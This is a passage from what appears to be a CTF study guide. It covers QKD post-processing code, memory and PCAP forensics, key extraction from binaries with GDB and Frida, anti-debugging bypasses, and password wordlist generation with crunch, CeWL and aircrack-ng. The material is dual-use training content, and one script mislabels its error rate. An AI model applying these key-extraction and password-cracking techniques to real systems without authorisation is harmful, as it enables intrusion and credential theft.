    @staticmethod
    def privacy_amplification(key, leaked_bits, security_parameter=100):
        """
        Privacy amplification using universal hash functions
        
        Final key length: n - leaked_bits - security_parameter
        """
        print("\nPrivacy Amplification")
        print("=" * 60)
        
        n = len(key)
        final_length = n - leaked_bits - security_parameter
        
        if final_length <= 0:
            print(f"[ERROR] Insufficient key material")
            print(f"  Initial: {n} bits")
            print(f"  Leaked: {leaked_bits} bits")
            print(f"  Security: {security_parameter} bits")
            return None
        
        print(f"Initial key length: {n} bits")
        print(f"Information leaked: {leaked_bits} bits")
        print(f"Security parameter: {security_parameter} bits")
        print(f"Final key length: {final_length} bits")
        
        # Simple hash-based amplification (XOR subsets)
        # Real implementations use Toeplitz matrix multiplication
        final_key = []
        
        for i in range(final_length):
            # Select random subset of input bits
            indices = random.sample(range(n), n // 2)
            bit = sum(key[j] for j in indices) % 2
            final_key.append(bit)
        
        print(f"\n[SUCCESS] Secure key generated: {final_length} bits")
        return final_key
    
    @staticmethod
    def complete_post_processing(alice_key, bob_key):
        """Run complete post-processing pipeline"""
        print("\n" + "="*60)
        print("COMPLETE QKD POST-PROCESSING")
        print("="*60)
        
        print(f"\nInput: {len(alice_key)} raw key bits")
        
        # Error correction
        bob_corrected, leaked = QKDPostProcessing.cascade_error_correction(
            alice_key, bob_key
        )
        
        if bob_corrected is None:
            print("\n[ABORT] Error correction failed")
            return None
        
        # Privacy amplification
        final_key = QKDPostProcessing.privacy_amplification(
            alice_key, leaked, security_parameter=100
        )
        
        if final_key:
            efficiency = len(final_key) / len(alice_key)
            print(f"\n[FINAL] Secure key efficiency: {efficiency*100:.1f}%")
            print(f"[FINAL] Key: {final_key[:32]}... ({len(final_key)} bits)")
            return final_key
        
        return None

# Example post-processing
print("\nQKD Post-Processing Example")
print("=" * 60)

# Generate keys with errors
n = 1000
alice_raw = [random.randint(0, 1) for _ in range(n)]
bob_raw = alice_raw.copy()

# Introduce 5% errors
error_rate = 0.05
for i in range(n):
    if random.random() < error_rate:
        bob_raw[i] = 1 - bob_raw[i]

# Run post-processing
final = QKDPostProcessing.complete_post_processing(alice_raw, bob_raw)
```

**QKD Certification Tools:**

```bash
#!/bin/bash
# QKD system certification script

cat > qkd_certification.sh << 'EOF'
#!/bin/bash

echo "=================================="
echo "QKD SYSTEM CERTIFICATION TOOLKIT"
echo "=================================="

# 1. Optical Power Monitoring
echo -e "\n[1] OPTICAL POWER MONITORING"
echo "Checking for excessive photon flux..."

# Monitor optical power at receiver
# In practice: use power meter or photodetector
# Threshold: normal signal level vs attack level

check_optical_power() {
    # Placeholder for actual measurement
    POWER_DB=-50  # dBm (typical single-photon level)
    THRESHOLD=-30  # dBm (detector blinding threshold)
    
    if [ $POWER_DB -gt $THRESHOLD ]; then
        echo "[WARNING] Excessive optical power detected!"
        echo "  Measured: ${POWER_DB} dBm"
        echo "  Threshold: ${THRESHOLD} dBm"
        echo "  Possible detector blinding attack"
        return 1
    else
        echo "[OK] Optical power within normal range"
        return 0
    fi
}

# 2. QBER Monitoring
echo -e "\n[2] QUANTUM BIT ERROR RATE (QBER)"
echo "Analyzing error patterns..."

analyze_qber() {
    # Simulate QBER calculation
    ERRORS=53
    TOTAL=1000
    QBER=$(echo "scale=4; $ERRORS / $TOTAL" | bc)
    THRESHOLD=0.11
    
    echo "  Errors: $ERRORS / $TOTAL"
    echo "  QBER: ${QBER} (${ERRORS}%)"
    echo "  Threshold: ${THRESHOLD} (11%)"
    
    if (( $(echo "$QBER > $THRESHOLD" | bc -l) )); then
        echo "[WARNING] QBER exceeds security threshold"
        echo "  Possible eavesdropping or channel degradation"
        return 1
    else
        echo "[OK] QBER acceptable"
        return 0
    fi
}

# 3. Timing Jitter Analysis
echo -e "\n[3] TIMING JITTER ANALYSIS"
echo "Checking detector timing stability..."

check_timing_jitter() {
    # Simulate jitter measurement (picoseconds)
    JITTER_PS=150
    THRESHOLD_PS=500
    
    echo "  Measured jitter: ${JITTER_PS} ps"
    echo "  Threshold: ${THRESHOLD_PS} ps"
    
    if [ $JITTER_PS -gt $THRESHOLD_PS ]; then
        echo "[WARNING] Excessive timing jitter"
        echo "  May enable timing attacks"
        return 1
    else
        echo "[OK] Timing jitter acceptable"
        return 0
    fi
}

# 4. Detector Dark Count Rate
echo -e "\n[4] DETECTOR DARK COUNT RATE"
echo "Measuring background noise..."

check_dark_counts() {
    DARK_RATE=250  # Hz
    THRESHOLD=1000  # Hz
    
    echo "  Dark count rate: ${DARK_RATE} Hz"
    echo "  Threshold: ${THRESHOLD} Hz"
    
    if [ $DARK_RATE -gt $THRESHOLD ]; then
        echo "[WARNING] Excessive dark counts"
        echo "  Detector may be compromised or damaged"
        return 1
    else
        echo "[OK] Dark count rate normal"
        return 0
    fi
}

# 5. Authentication Verification
echo -e "\n[5] CLASSICAL CHANNEL AUTHENTICATION"
echo "Verifying authentication protocol..."

verify_authentication() {
    # Check if authentication is properly implemented
    AUTH_ALGO="HMAC-SHA256"
    KEY_LENGTH=256
    
    echo "  Algorithm: ${AUTH_ALGO}"
    echo "  Key length: ${KEY_LENGTH} bits"
    
    if [ $KEY_LENGTH -lt 128 ]; then
        echo "[WARNING] Weak authentication key"
        return 1
    else
        echo "[OK] Authentication properly configured"
        return 0
    fi
}

# 6. Side-Channel Tests
echo -e "\n[6] SIDE-CHANNEL ANALYSIS"
echo "Testing for information leakage..."

test_side_channels() {
    echo "  [ ] Electromagnetic emissions"
    echo "  [ ] Power consumption patterns"
    echo "  [ ] Timing side-channels"
    echo "  [ ] Optical back-reflections"
    
    # In practice: use specialized equipment
    echo "[INFO] Detailed side-channel analysis required"
    echo "[INFO] Refer to ETSI GS QKD 008 for methodology"
}

# Run all tests
echo -e "\n=================================="
echo "RUNNING CERTIFICATION TESTS"
echo "=================================="

FAILED=0

check_optical_power || ((FAILED++))
analyze_qber || ((FAILED++))
check_timing_jitter || ((FAILED++))
check_dark_counts || ((FAILED++))
verify_authentication || ((FAILED++))
test_side_channels

# Summary
echo -e "\n=================================="
echo "CERTIFICATION SUMMARY"
echo "=================================="

if [ $FAILED -eq 0 ]; then
    echo "[PASS] All automatic tests passed"
    echo "[INFO] Manual testing and formal certification still required"
else
    echo "[FAIL] ${FAILED} test(s) failed"
    echo "[WARNING] System requires attention before deployment"
fi

echo -e "\nRefer to standards:"
echo "  - ETSI GS QKD 002: Use Cases and Requirements"
echo "  - ETSI GS QKD 008: Security Proofs"
echo "  - ITU-T Y.3800: Overview on Networks Supporting QKD"
echo "  - ISO/IEC 23837: Security Requirements for QKD"

EOF

chmod +x qkd_certification.sh
./qkd_certification.sh
```

**CTF Challenge: QKD Protocol Analysis**

```python
def qkd_ctf_challenge():
    """
    CTF-style challenge: Analyze captured QKD exchange data
    """
    print("\n" + "="*60)
    print("CTF CHALLENGE: QKD PROTOCOL ANALYSIS")
    print("="*60)
    
    print("""
SCENARIO:
You've intercepted communication between Alice and Bob attempting
to establish a quantum key. Analyze the captured data to determine:

1. Which protocol are they using? (BB84 or E91)
2. What is the QBER?
3. Is there evidence of eavesdropping?
4. Can you recover any key bits?

CAPTURED DATA:
""")
    
    # Simulated capture
    captured_bases = {
        'alice': [0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1],
        'bob':   [0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0]
    }
    
    captured_bits = {
        'alice': [0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1],
        'bob':   [0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0]
    }
    
    print("Basis choices (0=+, 1=×):")
    print(f"  Alice: {captured_bases['alice']}")
    print(f"  Bob:   {captured_bases['bob']}")
    
    print("\nMeasurement results:")
    print(f"  Alice: {captured_bits['alice']}")
    print(f"  Bob:   {captured_bits['bob']}")
    
    print("\n" + "-"*60)
    print("ANALYSIS:")
    print("-"*60)
    
    # Protocol identification
    print("\n[1] Protocol Identification:")
    print("  - Basis announcement: YES")
    print("  - Two bases used: YES")
    print("  - Conclusion: BB84 Protocol")
    
    # Basis reconciliation
    matching = [(i, captured_bases['alice'][i], captured_bases['bob'][i]) 
                for i in range(len(captured_bases['alice']))
                if captured_bases['alice'][i] == captured_bases['bob'][i]]
    
    print(f"\n[2] Basis Reconciliation:")
    print(f"  - Matching bases: {len(matching)}/{len(captured_bases['alice'])}")
    print(f"  - Indices: {[m[0] for m in matching]}")
    
    # Error detection
    sifted_alice = [captured_bits['alice'][i] for i, _, _ in matching]
    sifted_bob = [captured_bits['bob'][i] for i, _, _ in matching]
    
    errors = sum(1 for a, b in zip(sifted_alice, sifted_bob) if a != b)
    qber = errors / len(sifted_alice) if sifted_alice else 0
    
    print(f"\n[3] Error Detection:")
    print(f"  - Sifted key length: {len(sifted_alice)} bits")
    print(f"  - Errors: {errors}")
    print(f"  - QBER: {qber*100:.1f}%")
    
    if qber > 0.11:
        print(f"  - Status: INSECURE (QBER > 11%)")
        print(f"  - Evidence of eavesdropping: YES")
    elif qber > 0.05:
        print(f"  - Status: MARGINAL")
        print(f"  - Evidence of eavesdropping: POSSIBLE")
    else:
        print(f"  - Status: SECURE")
        print(f"  - Evidence of eavesdropping: NO")
    
    # Key recovery (for non-error bits)
    correct_bits = [a for a, b in zip(sifted_alice, sifted_bob) if a == b]
    
    print(f"\n[4] Partial Key Recovery:")
    print(f"  - Agreed bits: {len(correct_bits)}")
    print(f"  - Partial key: {correct_bits[:10]}...")
    
    print("\n" + "="*60)
    print("CHALLENGE COMPLETE")
    print("="*60)

# Run CTF challenge
qkd_ctf_challenge()
```

**Important Related Topics:**

- **Continuous-Variable QKD (CV-QKD)**: Uses coherent states instead of single photons, homodyne detection
- **Quantum Repeaters**: Extend QKD range beyond 100-300 km using entanglement swapping
- **Satellite QKD**: Free-space QKD via LEO/MEO satellites (e.g., Micius satellite)
- **Post-Quantum Cryptography Integration**: Hybrid classical-quantum security
- **Device-Independent QKD (DI-QKD)**: Security without trusting devices (requires loophole-free Bell tests)
- **Twin-Field QKD**: Achieves better distance scaling using phase-matching
- **Quantum Random Number Generators (QRNG)**: Essential for QKD implementations

**Key CTF Reconnaissance Tools:**

```bash
# QKD system fingerprinting
# Look for distinctive characteristics in captured traffic

# 1. Timing patterns (clock rates)
echo "Analyzing timing patterns..."
# BB84: typically 1 MHz - 1 GHz pulse rates
# E91: correlated photon pair detection

# 2. Basis announcement patterns
echo "Looking for basis reconciliation..."
# Public channel traffic after quantum transmission
# Characteristic message sizes and patterns

# 3. Error correction traffic
echo "Detecting error correction..."
# CASCADE protocol: multiple rounds, binary search patterns
# LDPC: matrix-based syndrome exchange

# 4. Wavelength analysis
echo "Identifying wavelengths..."
# 1310 nm, 1550 nm: fiber QKD
# 700-850 nm: free-space, silicon detectors
# Multiple wavelengths: WDM multiplexed systems

# 5. Detector signatures
echo "Detector characterization..."
# Dark count rates
# Efficiency patterns
# After-pulsing signatures
```

This covers practical QKD implementations including real-world constraints, attacks on implementations (not protocols), testing methodologies, and network deployment considerations critical for CTF scenarios involving quantum cryptographic systems.

---

# CTF-SPECIFIC TECHNIQUES

### Forensic Extraction

#### Memory Dumps (Volatility)

Volatility is a framework for analyzing volatile memory dumps in CTF forensics scenarios. It reconstructs system state from memory snapshots to recover flags, credentials, and malicious artifacts.

##### Profile Identification

Before analyzing a memory dump, determine the correct operating system profile. Volatility requires precise profile matching for accurate reconstruction.

```bash
volatility -f memory.dump imageinfo
```

This command scans the dump and suggests matching profiles. Review the output for the "Suggested Profile(s)" field. Common profiles include `WinXPSP3x86`, `Win7SP1x64`, or `LinuxUbuntu_5_4_0-42-generic_x64`.

Alternatively, use the `kdbgscan` plugin to locate the kernel debugger block:

```bash
volatility -f memory.dump --profile=Win7SP1x64 kdbgscan
```

##### Process Analysis

Enumerate running processes at the time of the dump capture:

```bash
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 pstree
```

`pslist` displays processes in memory order; `pstree` shows parent-child relationships. Identify suspicious processes with unusual parent relationships or names mimicking legitimate system processes.

For hidden processes (rootkit detection):

```bash
volatility -f memory.dump --profile=Win7SP1x64 psxscan
```

This performs a pool tag scan to find processes that may be unlinked from the process list.

##### Memory Region Extraction

Extract process address space for offline analysis:

```bash
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <PID> -D ./dumps/
```

Replace `<PID>` with the target process ID. This writes the process's entire virtual memory to a file. Analyze the output with strings, grep, or hex editors to locate embedded flags or credentials.

##### String Extraction

Search for readable strings across memory:

```bash
volatility -f memory.dump --profile=Win7SP1x64 strings -s | grep -i flag
volatility -f memory.dump --profile=Win7SP1x64 strings -s | grep -i password
volatility -f memory.dump --profile=Win7SP1x64 strings -s | grep -i ctf
```

The `-s` option scans for strings. Pipe output to `grep` for keyword filtering. For case-insensitive searches, use `-i`.

##### Registry Analysis (Windows)

Extract registry hives from memory:

```bash
volatility -f memory.dump --profile=Win7SP1x64 hivelist
```

This locates registry hive addresses in memory. Dump specific hives:

```bash
volatility -f memory.dump --profile=Win7SP1x64 hivescan
volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
```

Registry keys often contain persistence mechanisms, scheduled tasks, or user credentials relevant to CTF challenges.

##### Network Connection Analysis

Reconstruct network connections:

```bash
volatility -f memory.dump --profile=Win7SP1x64 netscan
volatility -f memory.dump --profile=Win7SP1x64 netstat
```

`netscan` uses pool tag scanning for connections; `netstat` reads kernel structures. Both reveal active TCP/UDP connections, listening ports, and associated process IDs.

##### Linux Memory Analysis

For Linux memory dumps, determine the kernel version and symbol table:

```bash
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Linux_Ubuntu_5_4_0-42-generic_x64 linux_pslist
volatility -f memory.dump --profile=Linux_Ubuntu_5_4_0-42-generic_x64 linux_netstat
volatility -f memory.dump --profile=Linux_Ubuntu_5_4_0-42-generic_x64 linux_bash
```

The `linux_bash` plugin extracts bash history from memory, often containing flags or sensitive commands.

#### Disk Analysis (Foremost, Scalpel)

These tools recover deleted files and carve data from unallocated disk space in CTF forensics scenarios.

##### Foremost Usage

Foremost scans disks for file headers and footers to recover deleted content:

```bash
foremost -i disk.img -o foremost_output/
```

This recursively scans `disk.img` and writes recovered files to `foremost_output/`. Specify file types to reduce noise:

```bash
foremost -i disk.img -t jpg,png,pdf,zip -o foremost_output/
```

Common CTF-relevant types include `zip` (archives), `pdf` (documents), `jpg/png` (images with embedded data), and `rar`. Review the `audit.txt` report in the output directory for recovery statistics.

For raw memory or fragmented disks:

```bash
foremost -i memory.dump -o memory_carving/ -T
```

The `-T` option enables verbose logging, showing which file types trigger matches.

##### Scalpel Usage

Scalpel is more configurable than foremost. Edit the configuration file to define custom signatures:

```bash
cat /etc/scalpel/scalpel.conf | grep -v "^#" | head -20
```

Run scalpel with the default configuration:

```bash
scalpel -i disk.img -o scalpel_output/
```

For custom recovery targets, modify the configuration:

```bash
nano /etc/scalpel/scalpel.conf
```

Example custom signature for CTF flags (if they follow a known pattern):

```
FLAG   ?     0      "FLAG{"   "}"
```

This searches for strings beginning with `FLAG{` and ending with `}`. After updating the config:

```bash
scalpel -c /etc/scalpel/scalpel.conf -i disk.img -o scalpel_output/
```

##### Partition Recovery

If the disk has deleted partitions, use `testdisk` or `gpart`:

```bash
testdisk disk.img
```

This opens an interactive menu for partition recovery. Navigate to "Analyse" to scan for lost partitions. Once identified, use `photorec` (bundled with testdisk) to recover files:

```bash
photorec disk.img
```

##### Slack Space Analysis

Unallocated space between files may contain flag fragments:

```bash
dd if=disk.img of=slack.bin bs=512 skip=2048 count=100
strings slack.bin | grep -i flag
```

Replace `skip` and `count` values based on your target disk sectors. Use `fdisk -l disk.img` to identify sector boundaries.

#### Network Packet Analysis (PCAP)

PCAP files capture network traffic and are common CTF forensics sources for extracted flags, credentials, or protocol anomalies.

##### Basic PCAP Inspection

Use `tcpdump` to read PCAP files:

```bash
tcpdump -r traffic.pcap
tcpdump -r traffic.pcap -i any
tcpdump -r traffic.pcap | head -50
```

Filter by protocol:

```bash
tcpdump -r traffic.pcap -i any 'tcp port 80'
tcpdump -r traffic.pcap 'udp port 53'
tcpdump -r traffic.pcap 'icmp'
```

##### Wireshark Analysis

Wireshark provides GUI-based packet analysis:

```bash
wireshark traffic.pcap &
```

Or analyze headless with `tshark`:

```bash
tshark -r traffic.pcap -Y 'http.request.method == "POST"'
tshark -r traffic.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name
tshark -r traffic.pcap -Y 'ftp-data' -T fields -e ftp-data.command
```

The `-Y` option filters by display filter (different from `-f` capture filters). The `-T fields -e` options extract specific protocol fields.

##### HTTP Traffic Extraction

Extract HTTP requests and responses:

```bash
tshark -r traffic.pcap -Y 'http' -T fields -e http.request.full_uri -e http.request.method -e http.response.code
```

For POST data containing credentials or flags:

```bash
tshark -r traffic.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data | xxd
```

Extract files transmitted over HTTP:

```bash
tcpflow -r traffic.pcap
```

This creates a directory structure organizing flows by source and destination IPs. Examine files within for embedded data.

##### DNS Analysis

Extract DNS queries and responses:

```bash
tshark -r traffic.pcap -Y 'dns' -T fields -e dns.qry.name -e dns.resp.addr
```

Exfiltrated data sometimes travels as DNS TXT records or through subdomain naming:

```bash
tshark -r traffic.pcap -Y 'dns.resp.type == "TXT"' -T fields -e dns.resp.name -e dns.resp.txt
```

##### SSL/TLS Decryption

If you have the server's private key or a pre-shared key, configure Wireshark to decrypt traffic. Set the key in Wireshark preferences:

Edit > Preferences > Protocols > SSL > Edit RSA keys list

Alternatively, use `ssldump`:

```bash
ssldump -r traffic.pcap -k /path/to/private.key
```

For session key extraction from a running process, use `sslkeylog.so` preload to write keys to a file, then configure Wireshark's `SSLKEYLOGFILE` environment variable.

##### Steganography Detection

Look for suspicious payloads or protocol anomalies indicating hidden data:

```bash
tshark -r traffic.pcap -Y 'http and (http.response.code == 200)' -T fields -e http.response.body | strings | grep -E '[A-Za-z0-9+/]{50,}={0,2}$'
```

This extracts HTTP response bodies and searches for base64-encoded strings. Extract suspicious blobs for offline analysis:

```bash
tshark -r traffic.pcap -T raw | file -
```

Test with `binwalk`, `strings`, or entropy analysis tools (`ent`) to identify embedded files or compression signatures.

##### Carving from PCAP

Extract raw bytes from specific flows:

```bash
tcpflow -r traffic.pcap -C
```

The `-C` option captures raw TCP content without interpretation. Combine with `file` identification:

```bash
tcpflow -r traffic.pcap -C | file -
```

Related Topics: Memory Forensics (advanced Volatility plugins), File System Forensics (ext4, NTFS analysis), Malware Analysis (identifying malicious payloads in traffic), Cryptographic Artifact Recovery (extracting encryption keys from memory or disk).

---

## Reverse Engineering Crypto

### Binary Analysis Fundamentals

Binary analysis for cryptographic reverse engineering requires identifying crypto implementations, extracting keys, and understanding custom algorithms. The primary tools serve different purposes:

**IDA Pro** provides the most sophisticated disassembly with hex-rays decompiler for readable pseudocode. Launch with `ida64` or `idag64` (GUI). Key features for crypto work:

- Auto-detection of common crypto libraries (OpenSSL, libcrypto)
- FLIRT signatures for recognizing standard implementations
- Cross-reference analysis (`x` key) to trace data flow
- Hex-Rays decompiler (F5) for C-like pseudocode

**Ghidra** (free NSA tool) offers comparable decompilation. Launch with `ghidraRun`. Critical features:

- CodeBrowser for disassembly viewing
- Decompiler window (auto-opens or Window → Decompile)
- Function Graph view for control flow
- Data Type Manager for structure identification

```bash
# Ghidra headless analysis
analyzeHeadless /path/to/project ProjectName -import /path/to/binary -postScript AnalyzeScript.java
```

**Radare2** excels at command-line analysis and scripting:

```bash
r2 -A binary        # Auto-analyze binary
aaa                 # Deep analysis (inside r2)
afl                 # List all functions
pdf @main          # Disassemble main function
iz                 # List strings in data sections
/R aes             # Search for AES instruction patterns
```

Common radare2 crypto hunting commands:

```bash
/c aes             # Search for AES constants (S-box values)
/x 637c777bf26b6fc5  # Search hex for AES S-box start
/R xor             # Find XOR operations
pdf @ sym.encrypt  # Disassemble suspected encryption function
```

### Dynamic Analysis Techniques

Dynamic analysis reveals runtime behavior, key material, and algorithm logic through execution tracing.

**GDB** (GNU Debugger) for breakpoint-based analysis:

```bash
gdb ./crypto_binary
break *0x401234           # Break at address
break encrypt             # Break at function
run input.txt             # Execute with arguments
x/32bx $rsi              # Examine 32 bytes at RSI register (common key location)
x/s $rdi                 # Examine string at RDI
info registers           # Show all register values
stepi                    # Step one instruction
continue                 # Resume execution
```

Key extraction pattern:

```bash
# Break before crypto operation
break *0x401500
commands
  x/16bx $rsi           # Print suspected key
  continue
end
run
```

**GEF** (GDB Enhanced Features) provides crypto-aware enhancements:

```bash
gef➤  pattern create 200        # Create cyclic pattern
gef➤  checksec                  # Check binary protections
gef➤  xinfo 0x7fffffffe000      # Memory region info
gef➤  search-pattern "randomstring"  # Search memory
```

**ltrace** tracks library calls (reveals crypto library usage):

```bash
ltrace ./binary input.txt
ltrace -e '*crypt*' ./binary    # Filter crypto-related calls
ltrace -e 'AES*' ./binary       # Track AES functions
ltrace -o trace.log ./binary    # Save to file
```

Common crypto library calls to monitor:

- `EVP_EncryptInit_ex`, `EVP_DecryptInit_ex` (OpenSSL)
- `AES_set_encrypt_key`, `AES_encrypt` (OpenSSL low-level)
- `MD5_Init`, `SHA256_Init` (hash functions)
- `memcpy` (often copies keys)

**strace** traces system calls (useful for file-based key storage):

```bash
strace ./binary 2>&1 | grep -E 'open|read|write'
strace -e trace=open,read ./binary     # Filter specific syscalls
strace -s 1000 ./binary                # Increase string capture length
strace -xx ./binary                    # Show all bytes in hex
```

Key files to watch:

- `/dev/urandom` reads (RNG usage)
- Configuration file reads
- Network socket operations (`connect`, `send`, `recv`)

### Identifying Cipher Implementation

Recognizing crypto algorithms requires pattern matching against known constants and structures.

**Constant-Based Identification:**

AES detection via S-box values:

```bash
# AES S-box starts with: 63 7c 77 7b f2 6b 6f c5
strings -tx binary | grep "637c777b"
radare2: /x 637c777bf26b6fc5

# Common in disassembly:
movzx eax, byte ptr [rax + 0x12345]  # S-box lookup pattern
```

DES detection via P-box permutations:

```bash
# DES P-box constant: 16 7 20 21 29 12 28 17
# Initial permutation table identifiable
```

RSA detection signatures:

- Modular exponentiation loops
- Large prime checking (Miller-Rabin patterns)
- Barrett reduction implementation
- Montgomery multiplication

**Instruction Pattern Recognition:**

[Inference] Common patterns (actual implementations vary):

XOR cipher characteristics:

```assembly
xor eax, [key_location]    # Repeated XOR operations
loop encryption_loop        # Simple loop structure
```

AES rounds identification:

```assembly
# 10/12/14 rounds depending on key size
# SubBytes → ShiftRows → MixColumns → AddRoundKey pattern
aesenc xmm0, xmm1          # Hardware AES instruction (modern CPUs)
```

RC4 key scheduling:

```assembly
# 256-byte S-box initialization
# KSA (Key Scheduling Algorithm) has characteristic loop
```

**Entropy Analysis:**

```python
# High entropy suggests strong encryption
import math
from collections import Counter

def entropy(data):
    if not data:
        return 0
    counter = Counter(data)
    length = len(data)
    return -sum((count/length) * math.log2(count/length) 
                for count in counter.values())

# Random data: ~8 bits/byte
# English text: ~4-5 bits/byte
# Encrypted data: ~7.9-8 bits/byte
```

### Key Extraction from Binary

**Static Key Extraction:**

Hardcoded keys in `.data` or `.rodata` sections:

```bash
# Radare2
iz                          # Strings in data section
izz                         # All strings including binary
px 32 @ obj.key            # Print 32 bytes at key object

# Objdump
objdump -s -j .rodata binary
objdump -s -j .data binary

# Hexdump patterns
hexdump -C binary | grep -A5 "possible_key_start"
```

Base64-encoded embedded keys:

```bash
strings binary | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$' | base64 -d
```

**Dynamic Key Extraction:**

Memory dumping at crypto function entry:

```python
# GDB Python scripting
import gdb

class DumpKey(gdb.Breakpoint):
    def stop(self):
        # Dump RSI register (common key parameter in x64)
        key_addr = gdb.parse_and_eval("$rsi")
        key_data = gdb.selected_inferior().read_memory(key_addr, 32)
        with open("extracted_key.bin", "wb") as f:
            f.write(key_data.tobytes())
        return False  # Continue execution

DumpKey("*0x401234")  # Set at encryption function
gdb.execute("run")
```

Frida dynamic instrumentation:

```javascript
// Attach to process and hook encryption
Interceptor.attach(Module.findExportByName(null, "AES_set_encrypt_key"), {
    onEnter: function(args) {
        console.log("Key length:", args[1].toInt32());
        console.log("Key data:", hexdump(args[0], {
            length: args[1].toInt32() / 8
        }));
    }
});
```

**Practical CTF Workflow:**

1. **Initial reconnaissance:**

```bash
file binary
strings binary | less
rabin2 -I binary        # Binary info (radare2)
checksec binary          # Security features
```

2. **Static analysis for crypto signatures:**

```bash
r2 -A binary
afl | grep -i 'crypt\|aes\|rsa\|des'
/c aes                   # Search constants
```

3. **Dynamic tracing:**

```bash
ltrace -e '*' ./binary 2>&1 | tee trace.log
strace -xx ./binary 2>&1 | tee syscalls.log
```

4. **Targeted debugging:**

```bash
gdb ./binary
break *identified_crypto_function
run
x/64bx $rsi              # Examine key parameter
```

5. **Key validation:**

```python
# Test extracted key
from Crypto.Cipher import AES
key = bytes.fromhex("extracted_key_hex")
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)
print(plaintext)
```

### Tool-Specific CTF Scenarios

**Scenario: Custom XOR with obfuscated key**

```bash
# 1. Identify XOR loop
r2 -A challenge
pdf @ main
# Look for: xor instruction, loop structure

# 2. Extract key derivation
gdb ./challenge
break *xor_loop_address
run
# Step through key generation
si
info registers
```

**Scenario: OpenSSL wrapper binary**

```bash
# Identify OpenSSL usage
ltrace ./wrapper 2>&1 | grep EVP_
# Shows: EVP_DecryptInit_ex, EVP_CIPHER_CTX_new

# Extract cipher mode and key
gdb ./wrapper
break EVP_DecryptInit_ex
run
# $rdi = context, $rsi = cipher type, $rdx = engine
# $rcx = key, $r8 = IV
x/16bx $rcx              # Print key
x/16bx $r8               # Print IV
```

**Scenario: Hardware AES instructions**

```bash
# Modern binaries use AESNI instructions
r2 -A modern_crypto
/R aesenc                # Find AES-NI usage
pdf @ hit_address

# Key schedule visible in registers
gdb ./modern_crypto
break *before_aesenc
run
info registers xmm       # XMM registers hold round keys
```

### Common CTF Anti-Analysis Techniques

**Debugger detection bypass:**

```bash
# ptrace anti-debug
gdb: catch syscall ptrace
# Patch return value: set $rax = 0

# Timing checks
gdb: set disable-randomization off
# Skip timing check: jump over_timing_check
```

**String obfuscation:**

```python
# Automated deobfuscation
import string
def xor_decrypt(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data)//len(key)+1)))

# Try common keys
for key in [b'key', b'password', b'\x42']:
    result = xor_decrypt(encrypted_strings, key)
    if all(c in string.printable.encode() for c in result):
        print(result)
```

### Important Related Topics

For comprehensive crypto CTF coverage, explore:

- **Side-Channel Analysis** - Timing attacks, power analysis, cache timing
- **Padding Oracle Attacks** - CBC mode exploitation, PKCS#7 errors
- **Custom Cipher Breaking** - Frequency analysis, known-plaintext attacks
- **Format String Exploitation** - Memory disclosure for key extraction

---

## Wordlist & Dictionary Generation

### Crunch - Custom Wordlist Generation

Crunch generates wordlists based on specified character sets and patterns, essential for CTF password cracking and brute-force scenarios.

#### Basic Syntax

bash

```bash
crunch <min-length> <max-length> [character-set] [options]
```

#### Character Set Specification

bash

```bash
# Lowercase only
crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Mixed case + numbers
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -o output.txt

# Custom character set
crunch 5 5 abc123 -o custom.txt
```

#### Pattern-Based Generation

bash

```bash
# @ = lowercase letters
# , = uppercase letters
# % = numbers
# ^ = special characters

# Pattern: 3 letters + 2 numbers
crunch 5 5 -t @@@%% -o pattern.txt

# CTF flag format: flag{5 lowercase}
crunch 10 10 -t flag{@@@@@} -o ctf_flags.txt

# Known prefix/suffix
crunch 8 8 -t pass@@@% -o passwords.txt
```

#### Size Management

bash

```bash
# Limit output size (MB)
crunch 6 8 abc123 -c 100 -o START

# Split into multiple files
crunch 7 7 -f /usr/share/crunch/charset.lst lalpha -b 50mb -o wordlist

# Piping directly to tools (memory efficient)
crunch 4 6 abc123 | aircrack-ng -w - capture.cap
```

#### Advanced Options

bash

```bash
# Suppress duplicates
crunch 4 4 abc -d 2@ -o unique.txt

# Permutation mode (rearrange input)
crunch 5 5 -p abc123 def456 -o permute.txt

# Invert character set (exclude characters)
crunch 6 6 -i -t @@@@%% -o inverted.txt

# Resume generation from specific string
crunch 5 5 abc123 -s aa3c1 -o resume.txt
```

### Common CTF Wordlists

#### RockYou

bash

```bash
# Location on Kali
/usr/share/wordlists/rockyou.txt.gz

# Extract
gunzip /usr/share/wordlists/rockyou.txt.gz

# First 1000 lines (quick tests)
head -n 1000 /usr/share/wordlists/rockyou.txt > rockyou_small.txt
```

#### SecLists

bash

```bash
# Install
sudo apt install seclists

# Common locations
/usr/share/seclists/Passwords/
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Passwords/Leaked-Databases/

# CTF-specific
/usr/share/seclists/Passwords/common-credentials.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
```

#### CeWL - Website Wordlist Generator

bash

```bash
# Basic crawl
cewl http://target.ctf -w custom_wordlist.txt

# Depth control + minimum word length
cewl -d 3 -m 5 http://target.ctf -w wordlist.txt

# Include metadata and email addresses
cewl -d 2 -m 4 --meta --email http://target.ctf -w complete.txt

# Authentication
cewl -d 2 http://target.ctf --auth_user admin --auth_pass pass123 -w auth_wordlist.txt

# Custom user-agent
cewl -d 2 http://target.ctf -u "Mozilla/5.0" -w wordlist.txt
```

### Hashcat Rule-Based Mutations

Hashcat rules transform wordlist entries to generate variations, significantly expanding coverage without massive wordlists.

#### Common Rule Files

bash

```bash
# Kali default location
/usr/share/hashcat/rules/

